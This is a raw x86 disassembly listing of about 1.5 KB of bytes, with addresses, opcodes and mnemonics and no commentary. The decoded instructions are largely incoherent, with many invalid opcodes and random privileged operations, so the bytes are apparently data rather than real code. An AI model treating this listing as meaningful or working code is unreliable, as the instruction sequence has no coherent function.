131585ff:	f3 12 81 fa 5e 1c 66 	repz adc 0x661c5efa(%ecx),%al
13158606:	fd                   	std
13158607:	17                   	pop    %ss
13158608:	75 e8                	jne    0x131585f2
1315860a:	84 c6                	test   %al,%dh
1315860c:	8d b7 df fe 3b c3    	lea    -0x3cc40121(%edi),%esi
13158612:	8b ca                	mov    %edx,%ecx
13158614:	83 e9 04             	sub    $0x4,%ecx
13158617:	8d 1c 01             	lea    (%ecx,%eax,1),%ebx
1315861a:	83 20 7c             	andl   $0x7c,(%eax)
1315861d:	0f c7                	(bad)
1315861f:	03 07                	add    (%edi),%eax
13158621:	18 80 8b 7b 7b 6b    	sbb    %al,0x6b7b7b8b(%eax)
13158627:	bb d1 b9 0c 10       	mov    $0x100cb9d1,%ebx
1315862c:	4f                   	dec    %edi
1315862d:	13 04 7c             	adc    (%esp,%edi,2),%eax
13158630:	0c 20                	or     $0x20,%al
13158632:	81 c9 02 15 80 7b    	or     $0x7b801502,%ecx
13158638:	5b                   	pop    %ebx
13158639:	a0 89 d0 0b 12       	mov    0x120bd089,%al
1315863e:	ff 05 9c 3f bb db    	incl   0xdbbb3f9c
13158644:	d8 bd b3 83 ea 04    	fdivrs 0x4ea83b3(%ebp)
1315864a:	54                   	push   %esp
1315864b:	e2 fc                	loop   0x13158649
1315864d:	e3 7f                	jecxz  0x131586ce
1315864f:	0a 01                	or     (%ecx),%al
13158651:	15 a0 ef 4d 7f       	adc    $0x7f4defa0,%eax
13158656:	73 3d                	jae    0x13158695
13158658:	10 80 3b 36 0c 7c    	adc    %al,0x7c0c363b(%eax)
1315865e:	0e                   	push   %cs
1315865f:	83 ca 02             	or     $0x2,%edx
13158662:	2a c0                	sub    %al,%al
13158664:	fe                   	(bad)
13158665:	92                   	xchg   %eax,%edx
13158666:	b1 4f                	mov    $0x4f,%cl
13158668:	83 0a 6c             	orl    $0x6c,(%edx)
1315866b:	49                   	dec    %ecx
1315866c:	0a 03                	or     (%ebx),%al
1315866e:	c2 83 20             	ret    $0x2083
13158671:	fe                   	(bad)
13158672:	70 ba                	jo     0x1315862e
13158674:	60                   	pusha
13158675:	0e                   	push   %cs
13158676:	07                   	pop    %es
13158677:	47                   	inc    %edi
13158678:	18 e1                	sbb    %ah,%cl
1315867a:	7a 06                	jp     0x13158682
1315867c:	81 af 08 05 74 29 04 	subl   $0xfa66da04,0x29740508(%edi)
13158683:	da 66 fa 
13158686:	db 57 53             	fistl  0x53(%edi)
13158689:	63 2b                	arpl   %ebp,(%ebx)
1315868b:	56                   	push   %esi
1315868c:	c8 33 11 f7          	enter  $0x1133,$0xf7
13158690:	c2 fe e1             	ret    $0xe1fe
13158693:	1f                   	pop    %ds
13158694:	f6 16                	notb   (%esi)
13158696:	da 1c 05 f6 01 d5 20 	ficompl 0x20d501f6(,%eax,1)
1315869d:	45                   	inc    %ebp
1315869e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
1315869f:	99                   	cltd
131586a0:	c3                   	ret
131586a1:	be c1 72 22 c6       	mov    $0xc62272c1,%esi
131586a6:	3b 70 08             	cmp    0x8(%eax),%esi
131586a9:	1d 06 20 09 94       	sbb    $0x94092006,%eax
131586ae:	de 7b 09             	fidivrs 0x9(%ebx)
131586b1:	a8 03                	test   $0x3,%al
131586b3:	de 54 63 e9          	ficoms -0x17(%ebx,%eiz,2)
131586b7:	fd                   	std
131586b8:	5e                   	pop    %esi
131586b9:	5a                   	pop    %edx
131586ba:	e1 33                	loope  0x131586ef
131586bc:	9f                   	lahf
131586bd:	03 a9 00 66 0b 25    	add    0x250b6600(%ecx),%ebp
131586c3:	59                   	pop    %ecx
131586c4:	6c                   	insb   (%dx),%es:(%edi)
131586c5:	b8 d7 f6 76 03       	mov    $0x376f6d7,%eax
131586ca:	d8 11                	fcoms  (%ecx)
131586cc:	a8 02                	test   $0x2,%al
131586ce:	75 d4                	jne    0x131586a4
131586d0:	f3 63 31             	repz arpl %esi,(%ecx)
131586d3:	83 02 7f             	addl   $0x7f,(%edx)
131586d6:	0b 4e 08             	or     0x8(%esi),%ecx
131586d9:	15 83 23 fe 3b       	adc    $0x3bfe2383,%eax
131586de:	af                   	scas   %es:(%edi),%eax
131586df:	d8 d6                	fcom   %st(6)
131586e1:	03 01                	add    (%ecx),%eax
131586e3:	08 c6                	or     %al,%dh
131586e5:	02 00                	add    (%eax),%al
131586e7:	25 f5 36 4a db       	and    $0xdb4a36f5,%eax
131586ec:	0a 70 d8             	or     -0x28(%eax),%dh
131586ef:	b8 a6 82 a4 ee       	mov    $0xeea482a6,%eax
131586f4:	37                   	aaa
131586f5:	57                   	push   %edi
131586f6:	ab                   	stos   %eax,%es:(%edi)
131586f7:	58                   	pop    %eax
131586f8:	4a                   	dec    %edx
131586f9:	e7 87                	out    %eax,$0x87
131586fb:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
131586fe:	2b d1                	sub    %ecx,%edx
13158700:	fe                   	(bad)
13158701:	f4                   	hlt
13158702:	1b 6c b7 7f          	sbb    0x7f(%edi,%esi,4),%ebp
13158706:	d4 f8                	aam    $0xf8
13158708:	2b 3d c6 b4 83 f8    	sub    0xf883b4c6,%edi
1315870e:	0c 7d                	or     $0x7d,%al
13158710:	14 9f                	adc    $0x9f,%al
13158712:	65 c8 d5 dd 01       	gs enter $0xddd5,$0x1
13158717:	04 6e                	add    $0x6e,%al
13158719:	73 07                	jae    0x13158722
1315871b:	78 eb                	js     0x13158708
1315871d:	63 05 ba b1 11 13    	arpl   %eax,0x1311b1ba
13158723:	d7                   	xlat   %ds:(%ebx)
13158724:	fe 8d bc 12 8b ee    	decb   -0x1174ed44(%ebp)
1315872a:	ec                   	in     (%dx),%al
1315872b:	5b                   	pop    %ebx
1315872c:	b7 6c                	mov    $0x6c,%bh
1315872e:	10 85 ed da 8b d5    	adc    %al,-0x2a742513(%ebp)
13158734:	2b d6                	sub    %esi,%edx
13158736:	62 3c 55 b6 1f 42 4b 	bound  %edi,0x4b421fb6(,%edx,2)
1315873d:	fc                   	cld
1315873e:	05 a6 73 0a 8d       	add    $0x8d0a73a6,%eax
13158743:	14 5e                	adc    $0x5e,%al
13158745:	d0 ed                	shr    $1,%ch
13158747:	ce                   	into
13158748:	ea fa 19 90 09 01 97 	ljmp   $0x9701,$0x99019fa
1315874f:	88 92 01 8a 0e 96    	mov    %dl,-0x69f175ff(%edx)
13158755:	3d 70 c2 ca e7       	cmp    $0xe7cac270,%eax
1315875a:	47                   	inc    %edi
1315875b:	7a 57                	jp     0x131587b4
1315875d:	8b 12                	mov    (%edx),%edx
1315875f:	a0 61 50 03 c6       	mov    0xc6035061,%al
13158764:	83 e8 71             	sub    $0x71,%eax
13158767:	1b d9                	sbb    %ecx,%ebx
13158769:	d8 4c 70 65          	fmuls  0x65(%eax,%esi,2)
1315876d:	fe                   	(bad)
1315876e:	37                   	aaa
1315876f:	88 85 d2 c7 ad c9    	mov    %al,-0x3652382e(%ebp)
13158775:	d2 63 c2             	shlb   %cl,-0x3e(%ebx)
13158778:	fa                   	cli
13158779:	64 90                	fs nop
1315877b:	f4                   	hlt
1315877c:	d3 f1                	shl    %cl,%ecx
1315877e:	c6                   	(bad)
1315877f:	e5 58                	in     $0x58,%eax
13158781:	10 0c 89             	adc    %cl,(%ecx,%ecx,4)
13158784:	5c                   	pop    %esp
13158785:	89 5b 9e             	mov    %ebx,-0x62(%ebx)
13158788:	1b eb                	sbb    %ebx,%ebp
1315878a:	3a 6d d4             	cmp    -0x2c(%ebp),%ch
1315878d:	d1 d6                	rcl    $1,%esi
1315878f:	fa                   	cli
13158790:	43                   	inc    %ebx
13158791:	08 13                	or     %dl,(%ebx)
13158793:	a9 5a 0e 2c ed       	test   $0xed2c0e5a,%eax
13158798:	c1 e0 d2             	shl    $0xd2,%eax
1315879b:	3e 3c 7c             	ds cmp $0x7c,%al
1315879e:	0d 50 0b 60 84       	or     $0x84600b50,%eax
131587a3:	32 b0 81 bd e7 17    	xor    0x17e7bd81(%eax),%dh
131587a9:	a1 00 1d 05 2d       	mov    0x2d051d00,%eax
131587ae:	87 0b                	xchg   %ecx,(%ebx)
131587b0:	b3 cf                	mov    $0xcf,%bl
131587b2:	56                   	push   %esi
131587b3:	36 04 7e             	ss add $0x7e,%al
131587b6:	40                   	inc    %eax
131587b7:	08 08                	or     %cl,(%eax)
131587b9:	0c 8d                	or     $0x8d,%al
131587bb:	df cd                	(bad)
131587bd:	09 9a 07 eb 2b a1    	or     %ebx,-0x5ed414f9(%edx)
131587c3:	13 83 c8 d0 34 8c    	adc    -0x73cb2f38(%ebx),%eax
131587c9:	d7                   	xlat   %ds:(%ebx)
131587ca:	ce                   	into
131587cb:	15 08 8b 06 30       	adc    $0x30068b08,%eax
131587d0:	9b                   	fwait
131587d1:	c1 73 cf c6          	shll   $0xc6,-0x31(%ebx)
131587d5:	0e                   	push   %cs
131587d6:	06                   	push   %es
131587d7:	25 8f e1 36 d8       	and    $0xd836e18f,%eax
131587dc:	60                   	pusha
131587dd:	61                   	popa
131587de:	f0 80 8d b6 a5 b5 fc 	lock orb $0x4b,-0x34a5a4a(%ebp)
131587e5:	4b 
131587e6:	36 cd 06             	ss int $0x6
131587e9:	4c                   	dec    %esp
131587ea:	0c 98                	or     $0x98,%al
131587ec:	08 10                	or     %dl,(%eax)
131587ee:	d6                   	salc
131587ef:	2b fc                	sub    %esp,%edi
131587f1:	18 95 08 0b 52 8b    	sbb    %dl,-0x74adf4f8(%ebp)
131587f7:	07                   	pop    %es
131587f8:	3b d8                	cmp    %eax,%ebx
131587fa:	30 4b b1             	xor    %cl,-0x4f(%ebx)
131587fd:	2b 15 fe b8 29 07    	sub    0x729b8fe,%edx
13158803:	01 47 8f             	add    %eax,-0x71(%edi)
13158806:	0a 04 f3             	or     (%ebx,%esi,8),%al
13158809:	03 d8                	add    %eax,%ebx
1315880b:	57                   	push   %edi
1315880c:	58                   	pop    %eax
1315880d:	68 e9 49 c6 16       	push   $0x16c649e9
13158812:	c1 28 16             	shrl   $0x16,(%eax)
13158815:	78 5c                	js     0x13158873
13158817:	e8 68 95 11 23       	call   0x36271d84
1315881c:	04 ba                	add    $0xba,%al
1315881e:	70 ac                	jo     0x131587cc
13158820:	8d b9 47 77 83 6f    	lea    0x6f837747(%ecx),%edi
13158826:	04 19                	add    $0x19,%al
13158828:	81 8b 1e 82 34 84 ad 	orl    $0x7e5b51ad,-0x7bcb7de2(%ebx)
1315882f:	51 5b 7e 
13158832:	10 5f 9c             	adc    %bl,-0x64(%edi)
13158835:	4d                   	dec    %ebp
13158836:	b4 67                	mov    $0x67,%ah
13158838:	e4 d4                	in     $0xd4,%al
1315883a:	8d                   	lea    (bad),%esi
1315883b:	f0 4a                	lock dec %edx
1315883d:	05 c4 65 30 fa       	add    $0xfa3065c4,%eax
13158842:	6e                   	outsb  %ds:(%esi),(%dx)
13158843:	4d                   	dec    %ebp
13158844:	8b c4                	mov    %esp,%eax
13158846:	94                   	xchg   %eax,%esp
13158847:	e4 8c                	in     $0x8c,%al
13158849:	02 27                	add    (%edi),%ah
1315884b:	11 83 12 4b 23 d5    	adc    %eax,-0x2adcb4ee(%ebx)
13158851:	d8 42 76             	fadds  0x76(%edx)
13158854:	cd 12                	int    $0x12
13158856:	69 8d c3 30 06 54 86 	imul   $0x96694286,0x540630c3(%ebp),%ecx
1315885d:	42 69 96 
13158860:	5f                   	pop    %edi
13158861:	99                   	cltd
13158862:	8e a1 08 4b dd 97    	mov    -0x6822b4f8(%ecx),%fs
13158868:	c0 f8 02             	sar    $0x2,%al
1315886b:	3d 00 95 7f c0       	cmp    $0xc07f9500,%eax
13158870:	15 a9 a6 41 e0       	adc    $0xe041a6a9,%eax
13158875:	e5 54                	in     $0x54,%eax
13158877:	82 d2 75             	adc    $0x75,%dl
1315887a:	08 75 ea             	or     %dh,-0x16(%ebp)
1315887d:	c0 63 7d 38          	shlb   $0x38,0x7d(%ebx)
13158881:	46                   	inc    %esi
13158882:	7b f0                	jnp    0x13158874
13158884:	bf 81 bd 04 f8       	mov    $0xf804bd81,%edi
13158889:	f8                   	clc
1315888a:	1f                   	pop    %ds
1315888b:	4b                   	dec    %ebx
1315888c:	98                   	cwtl
1315888d:	30 8e 89 84 9a 1f    	xor    %cl,0x1f9a8489(%esi)
13158893:	ae                   	scas   %es:(%edi),%al
13158894:	f0 38 52 87          	lock cmp %dl,-0x79(%edx)
13158898:	7e 7b                	jle    0x13158915
1315889a:	0a d6                	or     %dh,%dl
1315889c:	17                   	pop    %ss
1315889d:	17                   	pop    %ss
1315889e:	6e                   	outsb  %ds:(%esi),(%dx)
1315889f:	85 b6 7f 8d 17 45    	test   %esi,0x45178d7f(%esi)
131588a5:	13 1f                	adc    (%edi),%ebx
131588a7:	74 ad                	je     0x13158856
131588a9:	1f                   	pop    %ds
131588aa:	eb 3e                	jmp    0x131588ea
131588ac:	c7                   	(bad)
131588ad:	18 8c 63 15 0d d4 0d 	sbb    %cl,0xdd40d15(%ebx,%eiz,2)
131588b4:	d0 75 4e             	shlb   $1,0x4e(%ebp)
131588b7:	7b 57                	jnp    0x13158910
131588b9:	e9 ce 0c 70 99       	jmp    0xac85958c
131588be:	07                   	pop    %es
131588bf:	bf 0e eb 3b 75       	mov    $0x753beb0e,%edi
131588c4:	23 68 8d             	and    -0x73(%eax),%ebp
131588c7:	ed                   	in     (%dx),%eax
131588c8:	76 a4                	jbe    0x1315886e
131588ca:	29 04 83             	sub    %eax,(%ebx,%eax,4)
131588cd:	7d b1                	jge    0x13158880
131588cf:	7d 8e                	jge    0x1315885f
131588d1:	08 1a                	or     %bl,(%edx)
131588d3:	e1 08                	loope  0x131588dd
131588d5:	3b 7a 45             	cmp    0x45(%edx),%edi
131588d8:	00 b2 01 35 27 d6    	add    %dh,-0x29d8caff(%edx)
131588de:	67 eb 59             	addr16 jmp 0x1315893a
131588e1:	43                   	inc    %ebx
131588e2:	f0 21 83 ee 14 35 52 	lock and %eax,0x523514ee(%ebx)
131588e9:	6b 9c de eb 4c f4 55 	imul   $0xffffffc6,0x55f44ceb(%esi,%ebx,8),%ebx
131588f0:	c6 
131588f1:	af                   	scas   %es:(%edi),%eax
131588f2:	a2 10 eb 5d a6       	mov    %al,0xa65deb10
131588f7:	10 53 d3             	adc    %dl,-0x2d(%ebx)
131588fa:	03 d6                	add    %esi,%edx
131588fc:	92                   	xchg   %eax,%edx
131588fd:	64 8e c6             	fs mov %esi,%es
13158900:	56                   	push   %esi
13158901:	28 a2 1c 8b 75 e4    	sub    %ah,-0x1b8a74e4(%edx)
13158907:	3c 14                	cmp    $0x14,%al
13158909:	d6                   	salc
1315890a:	5c                   	pop    %esp
1315890b:	8f 07                	pop    (%edi)
1315890d:	ac                   	lods   %ds:(%esi),%al
1315890e:	18 06                	sbb    %al,(%esi)
13158910:	4d                   	dec    %ebp
13158911:	22 19                	and    (%ecx),%bl
13158913:	82 c1 5d             	add    $0x5d,%cl
13158916:	eb 54                	jmp    0x1315896c
13158918:	cd b2                	int    $0xb2
1315891a:	2b 10                	sub    (%eax),%edx
1315891c:	0c 2e                	or     $0x2e,%al
1315891e:	52                   	push   %edx
1315891f:	b0 08                	mov    $0x8,%al
13158921:	04 dd                	add    $0xdd,%al
13158923:	b7 e9                	mov    $0xe9,%bh
13158925:	c6                   	(bad)
13158926:	74 e6                	je     0x1315890e
13158928:	fb                   	sti
13158929:	f8                   	clc
1315892a:	d5 7e                	aad    $0x7e
1315892c:	0a a0 fc bb 10 e5    	or     -0x1aef4404(%eax),%ah
13158932:	b9 41 83 73 a9       	mov    $0xa9738341,%ecx
13158937:	45                   	inc    %ebp
13158938:	70 20                	jo     0x1315895a
1315893a:	31 ad 12 07 90 21    	xor    %ebp,0x21900712(%ebp)
13158940:	83 c3 45             	add    $0x45,%ebx
13158943:	65 3f                	gs aas
13158945:	34 c3                	xor    $0xc3,%al
13158947:	db 83 fb d9 05 bb    	fildl  -0x44fa2605(%ebx)
1315894d:	0c 34                	or     $0x34,%al
1315894f:	42                   	inc    %edx
13158950:	13 0f                	adc    (%edi),%ecx
13158952:	8f                   	(bad)
13158953:	93                   	xchg   %eax,%ebx
13158954:	20 2c 21             	and    %ch,(%ecx,%eiz,1)
13158957:	46                   	inc    %esi
13158958:	ec                   	in     (%dx),%al
13158959:	8b 84 c2 d7 54 7b 74 	mov    0x747b54d7(%edx,%eax,8),%eax
13158960:	79 b7                	jns    0x13158919
13158962:	32 c3                	xor    %bl,%al
13158964:	ae                   	scas   %es:(%edi),%al
13158965:	42                   	inc    %edx
13158966:	57                   	push   %edi
13158967:	28 02                	sub    %al,(%edx)
13158969:	13 f6                	adc    %esi,%esi
1315896b:	d0 75 1a             	shlb   $1,0x1a(%ebp)
1315896e:	29 0d bc 80 c0 0b    	sub    %ecx,0xbc080bc
13158974:	dc 40 7c             	faddl  0x7c(%eax)
13158977:	81 bc 26 8b cb be 5a 	cmpl   $0x3dc8e5e1,0x5abecb8b(%esi,%eiz,1)
1315897e:	e1 e5 c8 3d 
13158982:	44                   	inc    %esp
13158983:	8f 0a 89 4d          	(bad)
13158987:	8b 02                	mov    (%edx),%eax
13158989:	b0 9b                	mov    $0x9b,%al
1315898b:	72 8f                	jb     0x1315891c
1315898d:	4d                   	dec    %ebp
1315898e:	05 80 8b 52 08       	add    $0x8528b80,%eax
13158993:	f6 64 81 c1          	mulb   -0x3f(%ecx,%eax,4)
13158997:	dc bb f9 eb 5c 1d    	fdivrl 0x1d5cebf9(%ebx)
1315899d:	b1 1f                	mov    $0x1f,%cl
1315899f:	8e 1d 20 7c cf 3b    	mov    0x3bcf7c20,%ds
131589a5:	1d e8 7f 4a 29       	sbb    $0x294a7fe8,%eax
131589aa:	07                   	pop    %es
131589ab:	18 d2                	sbb    %dl,%dl
131589ad:	7b 48                	jnp    0x131589f7
131589af:	5b                   	pop    %ebx
131589b0:	0d 03 0e 31 1c       	or     $0x1c310e03,%eax
131589b5:	ca 46 4e             	lret   $0x4e46
131589b8:	99                   	cltd
131589b9:	1d d3 54 eb 32       	sbb    $0x32eb54d3,%eax
131589be:	39 49 b8             	cmp    %ecx,-0x48(%ecx)
131589c1:	23 a1 0d fc 1f b1    	and    -0x4ee003f3(%ecx),%esp
131589c7:	77 20                	ja     0x131589e9
131589c9:	d8 0c 6d 22 8b 2a 89 	fmuls  -0x76d574de(,%ebp,2)
131589d0:	2a 5d 93             	sub    -0x6d(%ebp),%bl
131589d3:	8b d0                	mov    %eax,%edx
131589d5:	f0 af                	lock scas %es:(%edi),%eax
131589d7:	8f                   	(bad)
131589d8:	51                   	push   %ecx
131589d9:	8d 7c df 49          	lea    0x49(%edi,%ebx,8),%edi
131589dd:	07                   	pop    %es
131589de:	39 84 94 1f 75 16 f7 	cmp    %eax,-0x8e98ae1(%esp,%edx,4)
131589e5:	67 c3                	addr16 ret
131589e7:	6b cd 08             	imul   $0x8,%ebp,%ecx
131589ea:	c7 38 06 98 12       	xbegin 0x25ad9027,(bad)
131589ef:	19 37                	sbb    %esi,(%edi)
131589f1:	94                   	xchg   %eax,%esp
131589f2:	02 c9                	add    %cl,%cl
131589f4:	16                   	push   %ss
131589f5:	22 af f8 8b 1e f6    	and    -0x9e17408(%edi),%ch
131589fb:	fd                   	std
131589fc:	ec                   	in     (%dx),%al
131589fd:	6c                   	insb   (%dx),%es:(%edi)
131589fe:	81 c3 9d 0f 42 09    	add    $0x9420f9d,%ebx
13158a04:	3b 11                	cmp    (%ecx),%edx
13158a06:	e9 ff 0d b7 29       	jmp    0x3ccc980a
13158a0b:	02 ed                	add    %ch,%ch
13158a0d:	c8 b8 c3 bc          	enter  $0xc3b8,$0xbc
13158a11:	29 05 cf 12 af 1b    	sub    %eax,0x1baf12cf
13158a17:	b4 29                	mov    $0x29,%ah
13158a19:	0e                   	push   %cs
13158a1a:	45                   	inc    %ebp
13158a1b:	8b f0                	mov    %eax,%esi
13158a1d:	59                   	pop    %ecx
13158a1e:	3b d0                	cmp    %eax,%edx
13158a20:	fa                   	cli
13158a21:	c1 08 86             	rorl   $0x86,(%eax)
13158a24:	08 f7                	or     %dh,%bh
13158a26:	e7 eb                	out    %eax,$0xeb
13158a28:	3e 6d                	ds insl (%dx),%es:(%edi)
13158a2a:	03 43 06             	add    0x6(%ebx),%eax
13158a2d:	0a 9a c2 3b 22 31    	or     0x31223bc2(%edx),%bl
13158a33:	1a 30                	sbb    (%eax),%dh
13158a35:	65 17                	gs pop %ss
13158a37:	03 2b                	add    (%ebx),%ebp
13158a39:	ad                   	lods   %ds:(%esi),%eax
13158a3a:	bc c0 61 06 76       	mov    $0x760661c0,%esp
13158a3f:	e1 48                	loope  0x13158a89
13158a41:	3b 3d 08 7a 98 50    	cmp    0x50987a08,%edi
13158a47:	36 70 75             	ss jo  0x13158abf
13158a4a:	2c 55                	sub    $0x55,%al
13158a4c:	60                   	pusha
13158a4d:	81 46 ac 0d cc db 12 	addl   $0x12dbcc0d,-0x54(%esi)
13158a54:	7e 05                	jle    0x13158a5b
13158a56:	8c 6f 7e             	mov    %gs,0x7e(%edi)
13158a59:	81 37 21 a4 db 0e    	xorl   $0xedba421,(%edi)
13158a5f:	f6 c2 02             	test   $0x2,%dl
13158a62:	74 1c                	je     0x13158a80
13158a64:	0e                   	push   %cs
13158a65:	cb                   	lret
13158a66:	c1 24 21 fd          	shll   $0xfd,(%ecx,%eiz,1)
13158a6a:	fb                   	sti
13158a6b:	0b 72 bd             	or     -0x43(%edx),%esi
13158a6e:	c0 7f 37 83          	sarb   $0x83,0x37(%edi)
13158a72:	08 01                	or     %al,(%ecx)
13158a74:	eb 29                	jmp    0x13158a9f
13158a76:	47                   	inc    %edi
13158a77:	83 78 04 07          	cmpl   $0x7,0x4(%eax)
13158a7b:	dc 84 dd 3e 7c 06 0a 	faddl  0xa067c3e(%ebp,%ebx,8)
13158a82:	08 0c 23             	or     %cl,(%ebx,%eiz,1)
13158a85:	13 c1                	adc    %ecx,%eax
13158a87:	6b 3a 9d             	imul   $0xffffff9d,(%edx),%edi
13158a8a:	d4 8d                	aam    $0x8d
13158a8c:	39 d3                	cmp    %edx,%ebx
13158a8e:	90                   	nop
13158a8f:	2c a1                	sub    $0xa1,%al
13158a91:	1d 03 90 07 c2       	sbb    $0xc2079003,%eax
13158a96:	a5                   	movsl  %ds:(%esi),%es:(%edi)
13158a97:	1d 22 36 76 25       	sbb    $0x25763622,%eax
13158a9c:	a9 5d cf 89 83       	test   $0x8389cf5d,%eax
13158aa1:	c6                   	(bad)
13158aa2:	ec                   	in     (%dx),%al
13158aa3:	e6 b5                	out    %al,$0xb5
13158aa5:	f0 a7                	lock cmpsl %es:(%edi),%ds:(%esi)
13158aa7:	59                   	pop    %ecx
13158aa8:	fe                   	(bad)
13158aa9:	be 8b e8 83 ed       	mov    $0xed83e88b,%esi
13158aae:	63 7d ba             	arpl   %edi,-0x46(%ebp)
13158ab1:	d0 c1                	rol    $1,%cl
13158ab3:	33 d7                	xor    %edi,%edx
13158ab5:	a9 71 c7 c7 3b       	test   $0x3bc7c771,%eax
13158aba:	fe ce                	dec    %dh
13158abc:	56                   	push   %esi
13158abd:	db 5c f8 b0          	fistpl -0x50(%eax,%edi,8)
13158ac1:	01 13                	add    %edx,(%ebx)
13158ac3:	f7 0a 48 83 84 86    	testl  $0x86848348,(%edx)
13158ac9:	a3 a5 ce d6 e7       	mov    %eax,0xe7d6cea5
13158ace:	7b 0a                	jnp    0x13158ada
13158ad0:	10 a3 60 6a 38 0a    	adc    %ah,0xa386a60(%ebx)
13158ad6:	71 5d                	jno    0x13158b35
13158ad8:	28 30                	sub    %dh,(%eax)
13158ada:	60                   	pusha
13158adb:	74 7d                	je     0x13158b5a
13158add:	05 87 0f 94 47       	add    $0x47940f87,%eax
13158ae2:	0e                   	push   %cs
13158ae3:	7b 0d                	jnp    0x13158af2
13158ae5:	23 15 1e 29 8b f7    	and    0xf78b291e,%edx
13158aeb:	3a 17                	cmp    (%edi),%dl
13158aed:	bc 7d 4e de 5b       	mov    $0x5bde4e7d,%esp
13158af2:	f6 03 02             	testb  $0x2,(%ebx)
13158af5:	53                   	push   %ebx
13158af6:	dd 01                	fldl   (%ecx)
13158af8:	bc 60 20 d6 4e       	mov    $0x4ed62060,%esp
13158afd:	de 0d a8 1b 8b dd    	fimuls 0xdd8b1ba8
13158b03:	d0 76 d0             	shlb   $1,-0x30(%esi)
13158b06:	4c                   	dec    %esp
13158b07:	a8 2d                	test   $0x2d,%al
13158b09:	10 89 03 1e 1a 66    	adc    %cl,0x661a1e03(%ecx)
13158b0f:	b3 61                	mov    $0x61,%bl
13158b11:	07                   	pop    %es
13158b12:	34 3b                	xor    $0x3b,%al
13158b14:	b3 c7                	mov    $0xc7,%bl
13158b16:	8d                   	lea    (bad),%eax
13158b17:	c1 60 a7 14          	shll   $0x14,-0x59(%eax)
13158b1b:	83 67 40 3b          	andl   $0x3b,0x40(%edi)
13158b1f:	de 9b 9d da 10 7c    	ficomps 0x7c10da9d(%ebx)
13158b25:	53                   	push   %ebx
13158b26:	ec                   	in     (%dx),%al
13158b27:	67 09 7a e9          	or     %edi,-0x17(%bp,%si)
13158b2b:	59                   	pop    %ecx
13158b2c:	ec                   	in     (%dx),%al
13158b2d:	92                   	xchg   %eax,%edx
13158b2e:	18 18                	sbb    %bl,(%eax)
13158b30:	27                   	daa
13158b31:	13 03                	adc    (%ebx),%eax
13158b33:	35 23 17 62 7c       	xor    $0x7c621723,%eax
13158b38:	01 4f 01             	add    %ecx,0x1(%edi)
13158b3b:	36 27                	ss daa
13158b3d:	00 25 42 b0 d6 1f    	add    %ah,0x1fd6b042
13158b43:	26 0b f0             	es or  %eax,%esi
13158b46:	89 d9                	mov    %ebx,%ecx
13158b48:	f8                   	clc
13158b49:	d4 86                	aam    $0x86
13158b4b:	1a be 2e 94 df b0    	sbb    -0x4f206bd2(%esi),%bh
13158b51:	4d                   	dec    %ebp
13158b52:	82 c2 a9             	add    $0xa9,%dl
13158b55:	b0 a9                	mov    $0xa9,%al
13158b57:	cd 00                	int    $0x0
13158b59:	0e                   	push   %cs
13158b5a:	02 3b                	add    (%ebx),%bh
13158b5c:	c4 7d 0e             	les    0xe(%ebp),%edi
13158b5f:	84 7b 2d             	test   %bh,0x2d(%ebx)
13158b62:	1a ad 9d df 71 f0    	sbb    -0xf8e2063(%ebp),%ch
13158b68:	b9 37 a1 1e a8       	mov    $0xa81ea137,%ecx
13158b6d:	86 c3                	xchg   %al,%bl
13158b6f:	d0 0e                	rorb   $1,(%esi)
13158b71:	56                   	push   %esi
13158b72:	bf 5e c9 4a d1       	mov    $0xd14ac95e,%edi
13158b77:	e2 e5                	loop   0x13158b5e
13158b79:	3a 03                	cmp    (%ebx),%al
13158b7b:	14 0e                	adc    $0xe,%al
13158b7d:	8b 5d bc             	mov    -0x44(%ebp),%ebx
13158b80:	e1 53                	loope  0x13158bd5
13158b82:	eb 2e                	jmp    0x13158bb2
13158b84:	80 21 24             	andb   $0x24,(%ecx)
13158b87:	07                   	pop    %es
13158b88:	74 44                	je     0x13158bce
13158b8a:	61                   	popa
13158b8b:	d8 da                	fcomp  %st(2)
13158b8d:	84 07                	test   %al,(%edi)
13158b8f:	1f                   	pop    %ds
13158b90:	af                   	scas   %es:(%edi),%eax
13158b91:	eb 9c                	jmp    0x13158b2f
13158b93:	c3                   	ret
13158b94:	09 76 45             	or     %esi,0x45(%esi)
13158b97:	e7 17                	out    %eax,$0x17
13158b99:	0d 01 52 58 19       	or     $0x19585201,%eax
13158b9e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
13158b9f:	ab                   	stos   %eax,%es:(%edi)
13158ba0:	1c 92                	sbb    $0x92,%al
13158ba2:	83 21 7f             	andl   $0x7f,(%ecx)
13158ba5:	65 7a 13             	gs jp  0x13158bbb
13158ba8:	4f                   	dec    %edi
13158ba9:	9d                   	popf
13158baa:	04 86                	add    $0x86,%al
13158bac:	07                   	pop    %es
13158bad:	14 b8                	adc    $0xb8,%al
13158baf:	4d                   	dec    %ebp
13158bb0:	b5 fc                	mov    $0xfc,%ch
13158bb2:	4c                   	dec    %esp
13158bb3:	04 92                	add    $0x92,%al
13158bb5:	24 da                	and    $0xda,%al
13158bb7:	83 12 24             	adcl   $0x24,(%edx)
13158bba:	75 71                	jne    0x13158c2d
13158bbc:	8c df                	mov    %ds,%edi
13158bbe:	05 89 5d fc eb       	add    $0xebfc5d89,%eax
13158bc3:	36 77 0e             	ss ja  0x13158bd4
13158bc6:	f0 4b                	lock dec %ebx
13158bc8:	c3                   	ret
13158bc9:	83 21 35             	andl   $0x35,(%ecx)
13158bcc:	32 63 67             	xor    0x67(%ebx),%ah
13158bcf:	6d                   	insl   (%dx),%es:(%edi)
13158bd0:	51                   	push   %ecx
13158bd1:	05 58 88 76 7d       	add    $0x7d768858,%eax
13158bd6:	02 1b                	add    (%ebx),%bl
13158bd8:	23 11                	and    (%ecx),%edx
13158bda:	45                   	inc    %ebp
13158bdb:	8c 0d bd dd cb 91    	mov    %cs,0x91cbddbd
13158be1:	24 15                	and    $0x15,%al
13158be3:	e8 3b ff 89 7d       	call   0x909f8b23
13158be8:	9e                   	sahf
13158be9:	9c                   	pushf
13158bea:	58                   	pop    %eax
13158beb:	80 bc bc 24 53 f6 81 	cmpb   $0xfb,-0x7e09acdc(%esp,%edi,4)
13158bf2:	fb 
13158bf3:	0b 3c 7e             	or     (%esi,%edi,2),%edi
13158bf6:	15 ff 15 34 c0       	adc    $0xc03415ff,%eax
13158bfb:	e6 83                	out    %al,$0x83
13158bfd:	0b df                	or     %edi,%ebx
13158bff:	d7                   	xlat   %ds:(%ebx)
